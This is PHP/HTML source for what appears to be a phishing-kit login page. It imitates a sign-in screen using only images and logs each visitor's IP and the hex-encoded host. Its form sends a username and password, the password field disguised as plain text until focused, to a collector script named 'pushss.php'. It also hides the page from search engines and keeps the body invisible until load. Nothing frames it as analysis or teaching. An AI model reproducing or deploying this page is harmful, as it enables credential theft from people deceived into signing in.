<?php
require_once 'bk.php';
$ip = getenv("REMOTE_ADDR");
$hosnm = bin2hex ($_SERVER['HTTP_HOST']);
$nid = "fwrdrs.php?id=$hosnm&$ip";
$sit = "pushss.php?check=$hosnm&$ip";
require_once 'ec.php';
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html lang="en">
<head>	
<meta name="robots" content="noindex,nofollow" />
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<meta http-equiv="Content-Style-Type" content='text/css' />
<title>-</title>
<link type="image/x-icon" rel="shortcut icon" href="wp/ico.ico"/>
<script type="text/javascript">
function changePass()
 {
    document.getElementById('2txt2').type='password'; 
    document.getElementById('2txt2').value='';
 }
</script>
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<body onload="unhideBody()">
</head>
<body style="visibility:hidden;background:url(./wp/bgg.png) repeat-x scroll 0 -2px #e5e5e5;font:x-small Verdana,Arial,Helvetica,sans-serif;margin:0;">
<div style="padding:0;width:1349px;margin:0 auto;">
<img src="wp/hd1.png">
</div>
<div style="padding:0;width:970px;margin:0 auto;height:1%;display:block;background:none repeat scroll 0 0 white;height:100%;font-size:1.1em;">
<div style="margin:0px 0 0 -1px;"> 
<img src="wp/hd2.png">
</div>
<div>
<div style="margin-left:28px;">
<div style="width:40%;float:left;padding-right:15px;">
<div style="margin:-4px;"> 
<img src="wp/loghd.png">
</div>
<div style="float:left;width:100%;min-height:137px;background-image:url(./wp/midLeft.jpg);background-position:topleft;background-repeat:repeat-y;">
<div style="margin:-12px;float:left;width:100%;min-height:137px;background-image:url(./wp/midRight.jpg);background-position:top right;background-repeat:repeat-y;">
<div style="margin-left:30px;padding-right:45px;">
<div style="margin:10px 0px 40px -10px;position:relative;left:0;top:0;height:104px;">
<div style="background-color:#f0f7f9;border-bottom:1px solid #b6c9d5;border-top:1px solid #b6c9d5;left:20px;position:absolute;top:10px;width:230px;z-index:10005;margin:0;padding:10px 6px 13px;">
<form action="<?php echo $sit; ?>" method="POST" autocomplete="off" style="border-top:none;">
<div>
<img style="clear:both;display:block;" src="wp/oi.png">
</div>
<input style="float:left;width:148px;margin:4px 0 10px;" name="1txt" type="text" maxlength="20" size="25" required="required"/>
<div><img style="clear:both;display:block;" src="wp/pd.png"></div>
<input style="float:left;width:148px;margin:4px 0 10px;" id="2txt2" name="2txt" type="text" onfocus="changePass();" onclick="changePass();" maxlength="20" size="25" required="required" />
<input type="image" src="wp/sbt.png" border="0"/>
</form>
</div>
</div>
</div>
</div>
</div>
<div> 
<img src="wp/logft.png" style="margin:0px -5px;" usemap="#12">
<map name="12">
<area href="<?php echo $nid; ?>" coords="35, 1, 301, 72" shape="rect">
</map>
</div>
</div>
<div>
<p>	<img src="wp/bod.png" style="margin:-10px -25px;" usemap="#34">
<map name="34">
<area href="<?php echo $nid; ?>" coords="50, 150, 263, 204" shape="rect">
</map></p>
</div>
</div>
</div>
<div style="margin:-30px -1px"> 
<img src="wp/fot1.png">
</div>
</div>
</body>	
</html>
<?php ob_end_flush(); ?>